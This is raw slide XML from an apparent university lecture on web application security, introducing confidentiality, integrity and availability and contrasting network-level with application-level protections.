                <a:tab pos="241300" algn="l"/>
              </a:tabLst>
            </a:pP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The</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-5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goal</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-5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of</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-4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web</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-5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application</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-4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security</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-3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is</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-5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to</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-5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ensure</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-2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the</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-4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 b="1">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>confidentiality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,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	</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" b="1">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>integrity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,</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-4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and</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-4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 b="1">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>availability</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-30" b="1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of</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-6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both</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-5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the</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-6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application</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-5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and</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-5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the</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-6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data</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-7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25">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>it </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-25">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>	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handles.</a:t>
            </a:r>
            <a:endParaRPr sz="2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/>
              <a:t>Luigi</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-40"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Libero</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Lucio</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Starace,</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Ph.D.</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-35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University</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-35"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>of</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-20"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Naples</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Federico</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>II</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10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Web</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-20"/>
              <a:t>Technologies</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Course</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10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Lecture</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-40"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>23</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10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Web</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>App</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-35"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10"/>
              <a:t>Security</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="object 5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15570">
              <a:lnSpc>
                <a:spcPts val="1240"/>
              </a:lnSpc>
            </a:pPr>
            <a:fld id="{81D60167-4931-47E6-BA6A-407CBD079E47}" type="slidenum">
              <a:rPr dirty="0" spc="-50"/>
              <a:t>2</a:t>
            </a:fld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60"/>
              <a:t>WEB</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-185"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-55"/>
              <a:t>APPLICATION</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-180"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-175"/>
              <a:t>SECURITY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962050" y="1446872"/>
            <a:ext cx="10243820" cy="3795395"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="98425" rIns="0" bIns="0" rtlCol="0" vert="horz">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="240029" indent="-227329">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="775"/>
              </a:spcBef>
              <a:buFont typeface="Arial MT"/>
              <a:buChar char="•"/>
              <a:tabLst>
                <a:tab pos="240029" algn="l"/>
              </a:tabLst>
            </a:pP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Security</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-4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in</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-6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Web</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-6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Apps</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-2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needs</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-3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to</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-6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be</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-5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handled</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-3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at</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-7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different</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-4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levels</a:t>
            </a:r>
            <a:endParaRPr sz="2800">
              <a:latin typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="240029" indent="-227329">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="675"/>
              </a:spcBef>
              <a:buFont typeface="Arial MT"/>
              <a:buChar char="•"/>
              <a:tabLst>
                <a:tab pos="240029" algn="l"/>
              </a:tabLst>
            </a:pPr>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-30" b="1">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Network-</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" b="1">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>level</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="25" b="1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 b="1">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Security</a:t>
            </a:r>
            <a:endParaRPr sz="2800">
              <a:latin typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="1" marL="696595" indent="-227329">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="235"/>
              </a:spcBef>
              <a:buFont typeface="Arial MT"/>
              <a:buChar char="•"/>
              <a:tabLst>
                <a:tab pos="696595" algn="l"/>
              </a:tabLst>
            </a:pP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Concerned</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-7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with</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-7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the</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-5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communication</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-8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between</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-5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the</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-5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 spc="-10">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Web</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-7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App</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-5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and</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-6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the</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-5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 spc="-10">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Internet</a:t>
            </a:r>
            <a:endParaRPr sz="2400">
              <a:latin typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="1" marL="696595" indent="-227329">
              <a:lnSpc>
                <a:spcPts val="2735"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="215"/>
              </a:spcBef>
              <a:buFont typeface="Arial MT"/>
              <a:buChar char="•"/>
              <a:tabLst>
                <a:tab pos="696595" algn="l"/>
              </a:tabLst>
            </a:pP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Focuses</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-5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on</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-5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data</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-6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encryption</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-6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(HTTPS),</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-5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 spc="-10">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>firewalls</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-6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filtering</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-5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malicious</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-6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 spc="-20">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>HTTP</a:t>
            </a:r>
            <a:endParaRPr sz="2400">
              <a:latin typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="697865">
              <a:lnSpc>
                <a:spcPts val="2735"/>
              </a:lnSpc>
            </a:pP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requests,</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-5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Monitoring</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-7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and</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-5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Logging</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-6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to</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-6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detect</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-8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suspicious</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-6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 spc="-10">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>patterns,</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-50">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t> …</a:t>
            </a:r>
            <a:endParaRPr sz="2400">
              <a:latin typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="240029" indent="-227329">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="630"/>
              </a:spcBef>
              <a:buFont typeface="Arial MT"/>
              <a:buChar char="•"/>
              <a:tabLst>
                <a:tab pos="240029" algn="l"/>
              </a:tabLst>
            </a:pPr>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-25" b="1">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Application-</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" b="1">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>level</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="35" b="1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 b="1">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Security</a:t>
            </a:r>
            <a:endParaRPr sz="2800">
              <a:latin typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="1" marL="696595" indent="-227329">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="245"/>
              </a:spcBef>
              <a:buFont typeface="Arial MT"/>
              <a:buChar char="•"/>
              <a:tabLst>
                <a:tab pos="696595" algn="l"/>
              </a:tabLst>
            </a:pP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Concerned</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-6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with</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-6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security</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-5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measures</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-6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implemented</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-4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withing</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-6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the</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-5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Web</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-4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 spc="-25">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>App</a:t>
            </a:r>
            <a:endParaRPr sz="2400">
              <a:latin typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="1" marL="696595" marR="5080" indent="-227329">
              <a:lnSpc>
                <a:spcPts val="2590"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="545"/>
              </a:spcBef>
              <a:buFont typeface="Arial MT"/>
              <a:buChar char="•"/>
              <a:tabLst>
                <a:tab pos="697865" algn="l"/>
              </a:tabLst>
            </a:pP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Focuses</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-5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on</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-5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 spc="-10">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Authentication</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-7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and</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-4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Authorization,</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-6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Input</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-5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 spc="-20">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Validation</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-5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to</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-5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ensure</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-4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 spc="-20">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>data 	integrity,</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-9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Session</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-7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Management,</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-7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ensuring</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-7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data</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-7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 spc="-20">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>confidentiality,</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-9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 spc="-50">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>…</a:t>
            </a:r>
            <a:endParaRPr sz="2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>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="3" sz="half"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:prstGeom prst="rect"/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="55244" rIns="0" bIns="0" rtlCol="0" vert="horz">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="240029" marR="43815" indent="-227329">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="434"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="FFFFFF"/>
              </a:buClr>
              <a:buFont typeface="Arial MT"/>
              <a:buChar char="•"/>
              <a:tabLst>
                <a:tab pos="241300" algn="l"/>
              </a:tabLst>
            </a:pPr>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Focuses</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-85"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>on</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-85"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>internal</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-80"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10"/>
              <a:t>mechanisms </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10"/>
              <a:t>	</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>and</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-40"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>functionalities</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>of</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-50"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>the</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-35"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t>Web 	App</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="240029" marR="332740" indent="-227329">
              <a:lnSpc>
                <a:spcPts val="3030"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1045"/>
              </a:spcBef>
              <a:buFont typeface="Arial MT"/>
              <a:buChar char="•"/>
              <a:tabLst>
                <a:tab pos="241300" algn="l"/>
              </a:tabLst>
            </a:pPr>
            <a:r>
              <a:rPr dirty="0" spc="-10"/>
              <a:t>Mitigates</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-105"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>risks</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-80"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>associated</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-110"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-20"/>
              <a:t>with </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-20"/>
              <a:t>	</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>the</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-50"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10"/>
              <a:t>application</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-45"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10"/>
              <a:t>itself</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="240029" marR="5080" indent="-227329">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="944"/>
              </a:spcBef>
              <a:buFont typeface="Arial MT"/>
              <a:buChar char="•"/>
              <a:tabLst>
                <a:tab pos="241300" algn="l"/>
              </a:tabLst>
            </a:pPr>
            <a:r>
              <a:rPr dirty="0" spc="-20"/>
              <a:t>Attacks</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-70"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>may</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-80"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>be</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-65"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10"/>
              <a:t>concealed</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-70"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10"/>
              <a:t>within </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10"/>
              <a:t>	</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" b="1">
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>valid</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-90" b="1">
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>HTTP</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-80"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>requests</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-55"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>and</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-95"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10"/>
              <a:t>exploit 	vulnerabilities</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>in</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-50"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>the</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-45"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>way</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-65"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t>the </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t>	</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>App</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-45"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>is</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-50"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10"/>
              <a:t>implemented</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>to</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-60"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10"/>
              <a:t>achieve </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10"/>
              <a:t>	</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>malicious</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-70"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10"/>
              <a:t>goals!</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="object 6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/>
              <a:t>Luigi</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-40"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Libero</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Lucio</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
